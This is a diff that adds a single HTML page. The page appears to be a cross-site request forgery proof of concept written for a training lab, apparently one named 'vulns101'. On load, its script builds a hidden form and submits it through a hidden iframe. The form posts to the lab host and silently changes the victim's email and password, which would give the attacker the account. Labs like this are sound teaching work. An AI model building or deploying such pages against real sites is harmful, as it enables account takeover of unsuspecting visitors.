@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>lomalka</title>
+    </head>
+    <script>     
+            window.onload = function(){
+
+                let form = document.createElement('form');
+                form.action = 'https://csrf1.vulns101.ar7z1.com/';
+                form.method = 'POST';
+
+                form.innerHTML = '<div class="card"><input class="form-control form-control-lg" type="hidden" placeholder="Новый email-адрес" id="email" name="email" value="1"><input class="form-control form-control-lg form-control-last" type="hidden" placeholder="Новый пароль" id="password" name="password" value = "2"></div>';
+
+ 
+             
+                fram.append(form);
+                form.submit();
+                               
+            }
+    </script>
+      <body>
+        <p>
+            <iframe  style="display:none;" id="fram">
+
+            </iframe>
+        </p>
+    </body>
+    <script>
+  
+    </script>
+</html>
